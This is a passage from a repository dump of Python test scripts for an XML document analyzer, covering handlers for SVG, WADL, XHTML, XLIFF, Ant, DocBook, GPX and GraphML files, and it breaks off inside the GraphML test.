            import traceback
            traceback.print_exc()
            return False
    
    return True

if __name__ == "__main__":
    print("🧪 Struts Configuration Handler Integration Test")
    print("=" * 60)
    
    success = test_struts_integration()
    
    if success:
        print("\n🎉 Struts handler integration test passed!")
        sys.exit(0)
    else:
        print("\n❌ Struts handler integration test failed!")
        sys.exit(1)
</file>

<file path="tests/integration/test_svg_integration.py">
#!/usr/bin/env python3
"""
Test SVG handler integration with main analyzer
"""

import sys
import os
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

def test_svg_integration():
    """Test SVG handler integration with main analyzer"""
    
    try:
        from core.analyzer import XMLDocumentAnalyzer
        print("✅ XMLDocumentAnalyzer imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import XMLDocumentAnalyzer: {e}")
        return False
    
    # Test registry import
    try:
        from handlers import ALL_HANDLERS, SVGHandler
        print(f"✅ Handler registry imported successfully ({len(ALL_HANDLERS)} handlers)")
        
        # Check if SVGHandler is in the registry
        svg_handler_in_registry = any(h.__name__ == 'SVGHandler' for h in ALL_HANDLERS)
        print(f"✅ SVGHandler in registry: {svg_handler_in_registry}")
        
    except ImportError as e:
        print(f"❌ Failed to import handler registry: {e}")
        return False
    
    # Test with sample SVG file
    analyzer = XMLDocumentAnalyzer()
    test_file = "../../sample_data/test_files_synthetic/small/svg/icon.svg"
    
    if not Path(test_file).exists():
        print(f"❌ Test file not found: {test_file}")
        return False
    
    print(f"\n🔍 Testing integration with {test_file}")
    
    try:
        result = analyzer.analyze_document(test_file)
        
        print(f"✅ Analysis completed successfully")
        print(f"  - Handler used: {result['handler_used']}")
        print(f"  - Document type: {result['document_type'].type_name}")
        print(f"  - Confidence: {result['confidence']:.1f}")
        print(f"  - Analysis type: {result['analysis'].document_type}")
        
        # Verify it's using the SVG handler
        if result['handler_used'] != 'SVGHandler':
            print(f"❌ Wrong handler used! Expected SVGHandler, got {result['handler_used']}")
            return False
        
        print("✅ SVG handler integration successful!")
        return True
        
    except Exception as e:
        print(f"❌ Analysis failed: {e}")
        import traceback
        traceback.print_exc()
        return False

if __name__ == "__main__":
    print("🧪 SVG Handler Integration Test")
    print("=" * 50)
    
    success = test_svg_integration()
    
    if success:
        print("\n🎉 SVG handler integration test passed!")
        sys.exit(0)
    else:
        print("\n❌ SVG handler integration test failed!")
        sys.exit(1)
</file>

<file path="tests/integration/test_wadl_integration.py">
#!/usr/bin/env python3
"""
Test WADL handler integration with main analyzer
"""

import sys
import os
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

def test_wadl_integration():
    """Test WADL handler integration with main analyzer"""
    
    try:
        from core.analyzer import XMLDocumentAnalyzer
        print("✅ XMLDocumentAnalyzer imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import XMLDocumentAnalyzer: {e}")
        return False
    
    # Test registry import
    try:
        from handlers import ALL_HANDLERS, WADLHandler
        print(f"✅ Handler registry imported successfully ({len(ALL_HANDLERS)} handlers)")
        
        # Check if WADLHandler is in the registry
        wadl_handler_in_registry = any(h.__name__ == 'WADLHandler' for h in ALL_HANDLERS)
        print(f"✅ WADLHandler in registry: {wadl_handler_in_registry}")
        
    except ImportError as e:
        print(f"❌ Failed to import handler registry: {e}")
        return False
    
    # Test with sample WADL files
    analyzer = XMLDocumentAnalyzer()
    test_files = [
        "../../sample_data/test_files_synthetic/small/wadl/simple_api.wadl",
        "../../sample_data/test_files_synthetic/small/wadl/complex_api.wadl"
    ]
    
    for test_file in test_files:
        if not Path(test_file).exists():
            print(f"❌ Test file not found: {test_file}")
            continue
        
        print(f"\n🔍 Testing integration with {test_file}")
        
        try:
            result = analyzer.analyze_document(test_file)
            
            print(f"✅ Analysis completed successfully")
            print(f"  - Handler used: {result['handler_used']}")
            print(f"  - Document type: {result['document_type'].type_name}")
            print(f"  - Version: {result['document_type'].version}")
            print(f"  - API Type: {result['document_type'].metadata.get('api_type')}")
            print(f"  - Confidence: {result['confidence']:.1f}")
            print(f"  - Analysis type: {result['analysis'].document_type}")
            
            # Verify it's using the WADL handler
            if result['handler_used'] != 'WADLHandler':
                print(f"❌ Wrong handler used! Expected WADLHandler, got {result['handler_used']}")
                return False
            
            # Check analysis details
            findings = result['analysis'].key_findings
            inventory = result['analysis'].data_inventory
            
            print(f"  - Total resources: {inventory['total_resources']}")
            print(f"  - Total methods: {inventory['total_methods']}")
            print(f"  - Total parameters: {inventory['total_parameters']}")
            print(f"  - Representation formats: {inventory['representation_formats']}")
            
            # Application info
            app_info = findings['application_info']
            print(f"  - Base URI: {app_info['base_uri']}")
            print(f"  - Title: {app_info['title']}")
            
            # Method distribution
            methods = findings['methods']
            print(f"  - Method distribution: {methods['method_distribution']}")
            
            # Security
            security = findings['security']
            print(f"  - Has authentication: {security['has_authentication']}")
            print(f"  - HTTPS required: {security['https_required']}")
            
            # Quality
            quality = result['analysis'].quality_metrics
            print(f"  - Overall quality: {quality['overall']:.2f}")
            print(f"  - Design quality: {quality['design_quality']:.2f}")
            
            print("  ✅ Integration test passed")
            
        except Exception as e:
            print(f"❌ Analysis failed: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    return True

if __name__ == "__main__":
    print("🧪 WADL Handler Integration Test")
    print("=" * 50)
    
    success = test_wadl_integration()
    
    if success:
        print("\n🎉 WADL handler integration test passed!")
        sys.exit(0)
    else:
        print("\n❌ WADL handler integration test failed!")
        sys.exit(1)
</file>

<file path="tests/integration/test_xhtml_integration.py">
#!/usr/bin/env python3
"""
Test XHTML handler integration with main analyzer
"""

import sys
import os
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

def test_xhtml_integration():
    """Test XHTML handler integration with main analyzer"""
    
    try:
        from core.analyzer import XMLDocumentAnalyzer
        print("✅ XMLDocumentAnalyzer imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import XMLDocumentAnalyzer: {e}")
        return False
    
    # Test registry import
    try:
        from handlers import ALL_HANDLERS, XHTMLHandler
        print(f"✅ Handler registry imported successfully ({len(ALL_HANDLERS)} handlers)")
        
        # Check if XHTMLHandler is in the registry
        xhtml_handler_in_registry = any(h.__name__ == 'XHTMLHandler' for h in ALL_HANDLERS)
        print(f"✅ XHTMLHandler in registry: {xhtml_handler_in_registry}")
        
    except ImportError as e:
        print(f"❌ Failed to import handler registry: {e}")
        return False
    
    # Test with sample XHTML files
    analyzer = XMLDocumentAnalyzer()
    test_files = [
        "../../sample_data/test_files_synthetic/small/xhtml/simple_page.xhtml",
        "../../sample_data/test_files_synthetic/small/xhtml/semantic_article.xhtml"
    ]
    
    for test_file in test_files:
        if not Path(test_file).exists():
            print(f"❌ Test file not found: {test_file}")
            continue
        
        print(f"\n🔍 Testing integration with {test_file}")
        
        try:
            result = analyzer.analyze_document(test_file)
            
            print(f"✅ Analysis completed successfully")
            print(f"  - Handler used: {result['handler_used']}")
            print(f"  - Document type: {result['document_type'].type_name}")
            print(f"  - Version: {result['document_type'].version}")
            print(f"  - Document subtype: {result['document_type'].metadata.get('document_type')}")
            print(f"  - Confidence: {result['confidence']:.1f}")
            print(f"  - Analysis type: {result['analysis'].document_type}")
            
            # Verify it's using the XHTML handler
            if result['handler_used'] != 'XHTMLHandler':
                print(f"❌ Wrong handler used! Expected XHTMLHandler, got {result['handler_used']}")
                return False
            
            # Check analysis details
            findings = result['analysis'].key_findings
            inventory = result['analysis'].data_inventory
            
            print(f"  - Total elements: {inventory['total_elements']}")
            print(f"  - Semantic elements: {inventory['semantic_elements']}")
            print(f"  - Links: {inventory['links']}")
            print(f"  - Forms: {inventory['forms']}")
            print(f"  - Images: {inventory['images']}")
            
            # Content analysis
            content = findings['content_analysis']
            print(f"  - Language: {content.get('language', 'unknown')}")
            print(f"  - Headings: {sum(content['headings'].values()) if content['headings'] else 0}")
            print(f"  - Paragraphs: {content['paragraphs']}")
            
            # Metadata
            metadata = findings['metadata']
            if metadata['title']:
                print(f"  - Title: {metadata['title'][:50]}...")
            
            # Quality
            quality = result['analysis'].quality_metrics
            print(f"  - Overall quality: {quality['overall']:.2f}")
            
            print("  ✅ Integration test passed")
            
        except Exception as e:
            print(f"❌ Analysis failed: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    return True

if __name__ == "__main__":
    print("🧪 XHTML Handler Integration Test")
    print("=" * 50)
    
    success = test_xhtml_integration()
    
    if success:
        print("\n🎉 XHTML handler integration test passed!")
        sys.exit(0)
    else:
        print("\n❌ XHTML handler integration test failed!")
        sys.exit(1)
</file>

<file path="tests/integration/test_xliff_integration.py">
#!/usr/bin/env python3
"""
Test XLIFF handler integration with the main framework
"""
import sys
import os
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

def test_xliff_integration():
    """Test XLIFF handler integration"""
    
    try:
        from xml_schema_analyzer_fixed import XMLSchemaAnalyzer
        from core.analyzer import XMLDocumentAnalyzer
        print("✅ Core modules imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import core modules: {e}")
        return False
    
    # Test files
    test_files = [
        "../../sample_data/test_files_synthetic/small/xliff/simple_translation.xlf",
        "../../sample_data/test_files_synthetic/small/xliff/multilingual_project.xlf",
        "../../sample_data/test_files_synthetic/small/xliff/software_ui_translation.xlf"
    ]
    
    analyzer = XMLDocumentAnalyzer()
    success_count = 0
    
    for test_file in test_files:
        if not Path(test_file).exists():
            print(f"❌ Test file not found: {test_file}")
            continue
        
        print(f"\n🔍 Testing {test_file}")
        
        try:
            import xml.etree.ElementTree as ET
            
            # Parse the XML
            tree = ET.parse(test_file)
            root = tree.getroot()
            
            # Extract namespaces
            namespaces = {}
            for prefix, uri in ET.iterparse(test_file, events=('start-ns',)):
                namespaces[prefix] = uri
            
            # Test full analysis
            result = analyzer.analyze_document(test_file)
            analysis = result.get('analysis')
            handler_used = result.get('handler_used', 'Unknown')
            
            if analysis:
                print(f"  - Document type: {analysis.document_type}")
                print(f"  - Translation units: {analysis.data_inventory.get('translation_units', 'N/A')}")
                print(f"  - Source language: {analysis.data_inventory.get('source_language', 'N/A')}")
                print(f"  - Target languages: {analysis.data_inventory.get('target_languages', 'N/A')}")
                print(f"  - Quality score: {analysis.quality_metrics.get('overall', 0.0):.2f}")
                
                # Verify it's using XLIFF handler
                if 'XLIFF' in handler_used:
                    print("✅ XLIFF handler correctly detected and used")
                    success_count += 1
                else:
                    print(f"❌ Wrong handler detected: {handler_used}")
            else:
                print(f"❌ No specialized analysis found. Handler used: {handler_used}")
            
        except Exception as e:
            print(f"❌ Error processing {test_file}: {e}")
            import traceback
            traceback.print_exc()
    
    print(f"\n📊 Integration Test Results: {success_count}/{len(test_files)} files processed successfully")
    return success_count == len(test_files)

if __name__ == "__main__":
    print("🧪 XLIFF Handler Integration Test")
    print("=" * 50)
    
    success = test_xliff_integration()
    
    if success:
        print("\n🎉 XLIFF handler integration test passed!")
        sys.exit(0)
    else:
        print("\n❌ XLIFF handler integration test failed!")
        sys.exit(1)
</file>

<file path="tests/unit/__init__.py">
"""Unit tests for individual XML handlers"""
</file>

<file path="tests/unit/test_ant_handler.py">
#!/usr/bin/env python3
"""
Test Ant Build Handler

Test the new Ant Build Handler implementation.
"""

import sys
from pathlib import Path
import json

# Add src directory to path
sys.path.insert(0, str(Path(__file__).parent / "src"))

def test_ant_handler():
    """Test the Ant Build Handler"""
    print("🧪 Testing Ant Build Handler")
    print("=" * 50)
    
    # Test files available
    test_files = [
        "../../sample_data/test_files_synthetic/small/ant/build.xml",
        "../../sample_data/test_files/small/ant/apache-ant-build.xml",
        "../../sample_data/test_files/small/ant/ant-ivy-build.xml",
        "../../sample_data/test_files/small/ant/maven-resolver-ant-build.xml"
    ]
    
    try:
        # Import the handler
        from handlers.ant_build_handler import AntBuildHandler
        print("✅ AntBuildHandler imported successfully")
        
        # Create handler instance
        handler = AntBuildHandler()
        print("✅ Handler instantiated successfully")
        
        # Test each file
        results = []
        for test_file in test_files:
            file_path = Path(test_file)
            if not file_path.exists():
                print(f"⏭️  Skipping {file_path.name} - file not found")
                continue
            
            print(f"\n🧪 Testing: {file_path.name}")
            
            try:
                # Parse XML
                import xml.etree.ElementTree as ET
                tree = ET.parse(file_path)
                root = tree.getroot()
                
                # Extract namespaces
                namespaces = {}
                try:
                    for event, elem in ET.iterparse(str(file_path), events=['start-ns']):
                        namespaces[event[0] if event[0] else 'default'] = event[1]
                except:
                    pass  # Some files might not have proper namespace parsing
                
                # Test detection
                can_handle, confidence = handler.can_handle(root, namespaces)
                print(f"  🎯 Detection: can_handle={can_handle}, confidence={confidence:.2f}")
                
                if can_handle:
                    # Test type detection
                    doc_type = handler.detect_type(root, namespaces)
                    print(f"  📄 Document Type: {doc_type.type_name}")
                    print(f"  📊 Metadata: {doc_type.metadata}")
                    
                    # Test analysis
                    analysis = handler.analyze(root, str(file_path))
                    print(f"  🔍 Analysis completed")
                    print(f"    - Targets: {len(analysis.key_findings['targets'])}")
                    print(f"    - Properties: {len(analysis.key_findings['properties']['inline_properties'])}")
                    print(f"    - Dependencies: {analysis.key_findings['dependencies']['total_count']}")
                    print(f"    - Tasks: {analysis.key_findings['tasks']['total_count']}")
                    print(f"    - Quality Score: {analysis.quality_metrics['overall']:.2f}")
                    
                    results.append({
                        'file': file_path.name,
                        'success': True,
                        'confidence': confidence,
                        'type': doc_type.type_name,
                        'targets': len(analysis.key_findings['targets']),
                        'quality': analysis.quality_metrics['overall']
                    })
                else:
                    print(f"  ❌ Handler cannot process this file")
                    results.append({
                        'file': file_path.name,
                        'success': False,
                        'confidence': confidence,
                        'error': 'Handler rejected file'
                    })
                    
            except Exception as e:
                print(f"  ❌ Error processing file: {e}")
                results.append({
                    'file': file_path.name,
                    'success': False,
                    'error': str(e)
                })
        
        # Summary
        print("\n" + "=" * 50)
        print("📋 TEST SUMMARY")
        print("=" * 50)
        
        successful = [r for r in results if r.get('success', False)]
        print(f"✅ Successful: {len(successful)}/{len(results)}")
        
        if successful:
            avg_confidence = sum(r['confidence'] for r in successful) / len(successful)
            avg_quality = sum(r['quality'] for r in successful) / len(successful)
            print(f"📊 Average Confidence: {avg_confidence:.2f}")
            print(f"📊 Average Quality Score: {avg_quality:.2f}")
            
            print(f"\n📂 Processed Files:")
            for result in successful:
                print(f"  ✅ {result['file']} - {result['targets']} targets, quality: {result['quality']:.2f}")
        
        failed = [r for r in results if not r.get('success', False)]
        if failed:
            print(f"\n❌ Failed Files:")
            for result in failed:
                print(f"  ❌ {result['file']} - {result.get('error', 'Unknown error')}")
        
        # Save detailed results
        with open('ant_handler_test_results.json', 'w') as f:
            json.dump(results, f, indent=2)
        print(f"\n💾 Detailed results saved to: ant_handler_test_results.json")
        
        # Determine success
        success_rate = len(successful) / len(results) if results else 0
        if success_rate >= 0.8:  # 80% success threshold
            print(f"\n🎉 Ant Handler Test PASSED! ({success_rate:.1%} success rate)")
            return True
        else:
            print(f"\n❌ Ant Handler Test FAILED! ({success_rate:.1%} success rate)")
            return False
            
    except Exception as e:
        print(f"❌ Critical error during testing: {e}")
        import traceback
        traceback.print_exc()
        return False

def main():
    """Main test execution"""
    success = test_ant_handler()
    
    if success:
        print("\n🚀 Ready to add Ant Handler to registry!")
    else:
        print("\n🛑 Fix issues before proceeding")
    
    return success

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
</file>

<file path="tests/unit/test_docbook_handler.py">
#!/usr/bin/env python3
"""
Test script for DocBook Handler
Tests the DocBook handler against synthetic test files.
"""

import sys
import os
import xml.etree.ElementTree as ET
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

# Test individual handler
try:
    from handlers.docbook_handler import DocBookHandler
    print("✅ DocBookHandler imported successfully")
except ImportError as e:
    print(f"❌ Failed to import DocBookHandler: {e}")
    sys.exit(1)

def test_handler():
    """Test the DocBook handler with synthetic files"""
    
    handler = DocBookHandler()
    test_files_dir = Path("../../sample_data/test_files_synthetic/small/docbook")
    
    if not test_files_dir.exists():
        print(f"❌ Test files directory not found: {test_files_dir}")
        return False
    
    docbook_files = list(test_files_dir.glob("*.xml"))
    if not docbook_files:
        print(f"❌ No DocBook files found in {test_files_dir}")
        return False
    
    print(f"\n🔍 Testing DocBook handler with {len(docbook_files)} files...")
    
    success_count = 0
    total_count = len(docbook_files)
    
    for docbook_file in docbook_files:
        print(f"\n📄 Testing: {docbook_file.name}")
        
        try:
            # Parse the XML file
            tree = ET.parse(docbook_file)
            root = tree.getroot()
            
            # Extract namespaces
            namespaces = {}
            for key, value in root.attrib.items():
                if key.startswith('xmlns'):
                    prefix = key.split(':')[1] if ':' in key else 'default'
                    namespaces[prefix] = value
            
            # Test can_handle
            can_handle, confidence = handler.can_handle(root, namespaces)
            print(f"  ✓ can_handle: {can_handle} (confidence: {confidence:.1f})")
            
            if not can_handle:
                print(f"  ❌ Handler cannot handle this file")
                continue
            
            # Test detect_type
            doc_type = handler.detect_type(root, namespaces)
            print(f"  ✓ detect_type: {doc_type.type_name} (v{doc_type.version})")
            print(f"    - Document type: {doc_type.metadata.get('document_type', 'unknown')}")
            
            # Test extract_key_data
            key_data = handler.extract_key_data(root)
            print(f"  ✓ extract_key_data: {len(key_data)} sections")
            print(f"    - Title: {key_data['document_metadata']['title']}")
            
            # Test full analysis
            analysis = handler.analyze(root, str(docbook_file))
            print(f"  ✓ analyze: {analysis.document_type}")
            print(f"    - Key findings: {len(analysis.key_findings)} sections")
            print(f"    - Recommendations: {len(analysis.recommendations)} items")
            print(f"    - AI use cases: {len(analysis.ai_use_cases)} cases")
            print(f"    - Data inventory: {sum(analysis.data_inventory.values())} items")
            print(f"    - Quality score: {analysis.quality_metrics.get('overall', 0):.2f}")
            
            # Test specific DocBook analysis
            docbook_info = analysis.key_findings.get('docbook_info', {})
            print(f"    - DocBook version: {docbook_info.get('version', 'Unknown')}")
            
            structure = analysis.key_findings.get('structure', {})
            print(f"    - Chapters: {len(structure.get('chapters', []))}")
            print(f"    - Sections: {structure.get('total_sections', 0)}")
            
            content = analysis.key_findings.get('content_stats', {})
            print(f"    - Paragraphs: {content.get('paragraphs', 0)}")
            print(f"    - Examples: {len(content.get('code_examples', []))}")
            
            quality = analysis.key_findings.get('quality_indicators', {})
            if quality:
                print(f"    - Quality score: {quality.get('quality_score', 0):.2f}")
            
            success_count += 1
            print(f"  ✅ {docbook_file.name} - SUCCESS")
            
        except Exception as e:
            print(f"  ❌ {docbook_file.name} - ERROR: {e}")
            import traceback
            traceback.print_exc()
    
    print(f"\n📊 DocBook Handler Test Results:")
    print(f"✅ Success: {success_count}/{total_count} ({success_count/total_count*100:.1f}%)")
    
    return success_count == total_count

if __name__ == "__main__":
    print("🧪 DocBook Handler Test Suite")
    print("=" * 50)
    
    success = test_handler()
    
    if success:
        print("\n🎉 All tests passed! DocBook handler is working correctly.")
        sys.exit(0)
    else:
        print("\n❌ Some tests failed. Please check the handler implementation.")
        sys.exit(1)
</file>

<file path="tests/unit/test_gpx_handler.py">
#!/usr/bin/env python3
"""
Test GPX handler implementation
"""

import sys
import os
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

def test_gpx_handler_import():
    """Test importing the GPX handler"""
    try:
        from handlers.gpx_handler import GPXHandler
        print("✅ GPXHandler imported successfully")
        return True
    except ImportError as e:
        print(f"❌ Failed to import GPXHandler: {e}")
        return False

def test_gpx_handler_instantiation():
    """Test creating GPX handler instance"""
    try:
        from handlers.gpx_handler import GPXHandler
        handler = GPXHandler()
        print("✅ GPXHandler instantiated successfully")
        return handler
    except Exception as e:
        print(f"❌ Failed to instantiate GPXHandler: {e}")
        return None

def test_gpx_files():
    """Test GPX handler with sample files"""
    from handlers.gpx_handler import GPXHandler
    import xml.etree.ElementTree as ET
    
    handler = GPXHandler()
    test_files = [
        "../../sample_data/test_files_synthetic/small/gpx/simple_waypoints.gpx",
        "../../sample_data/test_files_synthetic/small/gpx/hiking_track.gpx", 
        "../../sample_data/test_files_synthetic/small/gpx/cycling_route.gpx",
        "../../sample_data/test_files_synthetic/small/gpx/running_activity.gpx"
    ]
    
    results = []
    
    for test_file in test_files:
        if not Path(test_file).exists():
            print(f"❌ Test file not found: {test_file}")
            continue
            
        print(f"\n🔍 Testing {test_file}")
        
        try:
            # Parse XML
            tree = ET.parse(test_file)
            root = tree.getroot()
            
            # Extract namespaces
            namespaces = {}
            for event, elem in ET.iterparse(test_file, events=['start-ns']):
                if event == 'start-ns':
                    prefix, uri = elem
                    namespaces[prefix or 'default'] = uri
            
            # Test can_handle
            can_handle, confidence = handler.can_handle(root, namespaces)
            print(f"  - can_handle: {can_handle} (confidence: {confidence:.2f})")
            
            if can_handle:
                # Test detect_type
                doc_type = handler.detect_type(root, namespaces)
                print(f"  - Document type: {doc_type.type_name}")
                print(f"  - Version: {doc_type.version}")
                print(f"  - Content type: {doc_type.metadata.get('content_type', 'unknown')}")
                print(f"  - Confidence: {doc_type.confidence:.2f}")
                
                # Test analyze
                analysis = handler.analyze(root, test_file)
                print(f"  - Analysis type: {analysis.document_type}")
                print(f"  - Key findings keys: {list(analysis.key_findings.keys())}")
                print(f"  - Data inventory: {analysis.data_inventory}")
                print(f"  - AI use cases: {len(analysis.ai_use_cases)}")
                
                # Show specific findings
                findings = analysis.key_findings
                if findings['waypoints']['count'] > 0:
                    print(f"  - Waypoints: {findings['waypoints']['count']}")
                if findings['tracks']['count'] > 0:
                    print(f"  - Tracks: {findings['tracks']['count']}")
                    total_points = sum(track['total_points'] for track in findings['tracks']['tracks'])
                    print(f"  - Total track points: {total_points}")
                if findings['routes']['count'] > 0:
                    print(f"  - Routes: {findings['routes']['count']}")
                
                stats = findings['statistics']
                if stats['total_distance_km'] > 0:
                    print(f"  - Total distance: {stats['total_distance_km']:.2f} km")
                if stats['total_duration_hours'] > 0:
                    print(f"  - Duration: {stats['total_duration_hours']:.2f} hours")
                if stats['elevation_gain_m'] > 0:
                    print(f"  - Elevation gain: {stats['elevation_gain_m']:.0f} m")
                
                print(f"  - Quality metrics: {analysis.quality_metrics}")
                
                # Test extract_key_data
                key_data = handler.extract_key_data(root)
                print(f"  - Key data keys: {list(key_data.keys())}")
                
                results.append({
                    'file': test_file,
                    'success': True,
                    'confidence': confidence,
                    'waypoints': findings['waypoints']['count'],
                    'tracks': findings['tracks']['count'],
                    'routes': findings['routes']['count'],
                    'distance_km': stats['total_distance_km'],
                    'content_type': doc_type.metadata.get('content_type')
                })
                print("  ✅ Test passed")
            else:
                results.append({
                    'file': test_file,
                    'success': False,
                    'reason': 'Handler rejected file'
                })
                print("  ❌ Handler cannot handle this file")
                
        except Exception as e:
            print(f"  ❌ Test failed: {e}")
            results.append({
                'file': test_file,
                'success': False,
                'reason': str(e)
            })
            import traceback
            traceback.print_exc()
    
    return results

def main():
    print("🧪 GPX Handler Test Suite")
    print("=" * 50)
    
    # Test import
    if not test_gpx_handler_import():
        return False
    
    # Test instantiation
    handler = test_gpx_handler_instantiation()
    if not handler:
        return False
    
    # Test with files
    results = test_gpx_files()
    
    # Summary
    print(f"\n📊 Test Results Summary")
    print("=" * 30)
    
    successful = [r for r in results if r['success']]
    failed = [r for r in results if not r['success']]
    
    print(f"✅ Successful: {len(successful)}/{len(results)}")
    print(f"❌ Failed: {len(failed)}/{len(results)}")
    
    if successful:
        avg_confidence = sum(r['confidence'] for r in successful) / len(successful)
        print(f"📈 Average confidence: {avg_confidence:.2f}")
        
        total_waypoints = sum(r.get('waypoints', 0) for r in successful)
        total_tracks = sum(r.get('tracks', 0) for r in successful)
        total_routes = sum(r.get('routes', 0) for r in successful)
        total_distance = sum(r.get('distance_km', 0) for r in successful)
        
        print(f"📍 Total waypoints detected: {total_waypoints}")
        print(f"🛤️ Total tracks detected: {total_tracks}")
        print(f"🗺️ Total routes detected: {total_routes}")
        print(f"📏 Total distance: {total_distance:.2f} km")
        
        print(f"\n📋 Content Types Detected:")
        content_types = {}
        for result in successful:
            ct = result.get('content_type', 'unknown')
            content_types[ct] = content_types.get(ct, 0) + 1
        for ct, count in content_types.items():
            print(f"  - {ct}: {count}")
    
    if failed:
        print("\n❌ Failed tests:")
        for result in failed:
            print(f"  - {Path(result['file']).name}: {result['reason']}")
    
    success_rate = len(successful) / len(results) * 100 if results else 0
    print(f"\n🎯 Success rate: {success_rate:.1f}%")
    
    return success_rate == 100.0

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
</file>

<file path="tests/unit/test_graphml_handler.py">
#!/usr/bin/env python3
"""
Test GraphML handler implementation
"""
import sys
import os
from pathlib import Path

# Add the src directory to the path
sys.path.append(os.path.join(os.path.dirname(__file__), '../../src'))

def test_graphml_handler():
    """Test GraphML handler with sample files"""
    
    try:
        from handlers.graphml_handler import GraphMLHandler
        print("✅ GraphMLHandler imported successfully")
    except ImportError as e:
        print(f"❌ Failed to import GraphMLHandler: {e}")
        return False
    
    # Test files
    test_files = [
        "../../sample_data/test_files_synthetic/small/graphml/simple_network.graphml",
        "../../sample_data/test_files_synthetic/small/graphml/neural_network.graphml",
        "../../sample_data/test_files_synthetic/small/graphml/dependency_graph.graphml"
    ]
    
    handler = GraphMLHandler()
    success_count = 0
    
    for test_file in test_files:
        if not Path(test_file).exists():
            print(f"❌ Test file not found: {test_file}")
            continue
        
        print(f"\n🔍 Testing {test_file}")
        
        try:
            import xml.etree.ElementTree as ET
            
            # Parse the XML
            tree = ET.parse(test_file)
            root = tree.getroot()
            
            # Extract namespaces
            namespaces = {}
            for prefix, uri in ET.iterparse(test_file, events=('start-ns',)):
                namespaces[prefix] = uri
            
            # Test can_handle
            can_handle, confidence = handler.can_handle(root, namespaces)
            print(f"  - Can handle: {can_handle} (confidence: {confidence:.2f})")
            
            if not can_handle:
                print(f"❌ Handler cannot handle this file")
                continue
            
            # Test detect_type
            doc_type = handler.detect_type(root, namespaces)
            print(f"  - Document type: {doc_type.type_name}")
            print(f"  - Version: {doc_type.version}")
            print(f"  - Graph type: {doc_type.metadata.get('graph_type')}")
            print(f"  - Complexity: {doc_type.metadata.get('complexity')}")
            print(f"  - Node count: {doc_type.metadata.get('node_count')}")
            print(f"  - Edge count: {doc_type.metadata.get('edge_count')}")
            
            # Test analyze
            analysis = handler.analyze(root, test_file)
            print(f"  - Analysis type: {analysis.document_type}")
            
            # Check key findings
            findings = analysis.key_findings
            
            # File info
            file_info = findings['file_info']
            print(f"  - Root element: {file_info['root_element']}")
            print(f"  - Version: {file_info['version']}")
            
            # Graph structure
            structure = findings['graph_structure']
            print(f"  - Graph count: {structure['graph_count']}")
            print(f"  - Directed graphs: {structure['directed_graphs']}")
            print(f"  - Undirected graphs: {structure['undirected_graphs']}")
            
            # Nodes
            nodes = findings['nodes']
            print(f"  - Node count: {nodes['node_count']}")
            print(f"  - Isolated nodes: {nodes['isolated_nodes']}")
            print(f"  - Max degree: {nodes['max_degree']}")
            print(f"  - Node attributes: {len(nodes['node_attributes'])}")
            
            # Edges
            edges = findings['edges']
            print(f"  - Edge count: {edges['edge_count']}")
            print(f"  - Self loops: {edges['self_loops']}")
            print(f"  - Parallel edges: {edges['parallel_edges']}")
            print(f"  - Edge attributes: {len(edges['edge_attributes'])}")
            
            # Attributes
            attributes = findings['attributes']
            print(f"  - Attribute keys: {attributes['key_count']}")
            print(f"  - Attribute types: {list(attributes['attribute_types'].keys())}")
            
            # Network metrics
            metrics = findings['network_metrics']
            print(f"  - Density: {metrics['density']:.3f}")
            print(f"  - Avg clustering: {metrics['avg_clustering']:.3f}")
            print(f"  - Diameter estimate: {metrics['diameter_estimate']}")
            
            # Data properties
            data_props = findings['data_properties']
            print(f"  - Data elements: {data_props['data_count']}")
            print(f"  - Empty data: {data_props['empty_data']}")
            print(f"  - Value types: {list(data_props['value_types'].keys())}")
            
            # Layout info
            layout = findings['layout_info']
            print(f"  - Has coordinates: {layout['has_coordinates']}")
            print(f"  - Coordinate keys: {layout['coordinate_keys']}")
            print(f"  - Visual attributes: {len(layout['visual_attributes'])}")
            print(f"  - Geometric data: {layout['geometric_data']}")
            
            # Connectivity
            connectivity = findings['connectivity']
            print(f"  - Average degree: {connectivity['average_degree']:.2f}")
            print(f"  - Connectivity ratio: {connectivity['connectivity_ratio']:.3f}")
            
            # Data inventory
            inventory = analysis.data_inventory
            print(f"  - Total graphs: {inventory['total_graphs']}")
            print(f"  - Total nodes: {inventory['total_nodes']}")
            print(f"  - Total edges: {inventory['total_edges']}")
            print(f"  - Attribute keys: {inventory['attribute_keys']}")
            print(f"  - Data elements: {inventory['data_elements']}")
            
            # Quality metrics
            quality = analysis.quality_metrics
            print(f"  - Overall quality: {quality['overall']:.2f}")
            print(f"  - Completeness: {quality['completeness']:.2f}")
            print(f"  - Consistency: {quality['consistency']:.2f}")
            print(f"  - Connectivity: {quality['connectivity']:.2f}")
            print(f"  - Attribute coverage: {quality['attribute_coverage']:.2f}")
            
            # Structured data
            structured_data = analysis.structured_data
            print(f"  - Graph metadata keys: {list(structured_data['graph_metadata'].keys())}")
            print(f"  - Node catalog count: {len(structured_data['node_catalog'])}")
            print(f"  - Edge catalog count: {len(structured_data['edge_catalog'])}")
            print(f"  - Attribute schema keys: {list(structured_data['attribute_schema'].keys())}")
            
            # AI use cases (first 3)
            print(f"  - AI use cases ({len(analysis.ai_use_cases)}): {analysis.ai_use_cases[:3]}")
            
            print(f"✅ {test_file} processed successfully")
            success_count += 1
            
        except Exception as e:
            print(f"❌ Error processing {test_file}: {e}")
            import traceback
            traceback.print_exc()
    
    print(f"\n📊 Test Results: {success_count}/{len(test_files)} files processed successfully")
    return success_count == len(test_files)

if __name__ == "__main__":
    print("🧪 GraphML Handler Test")
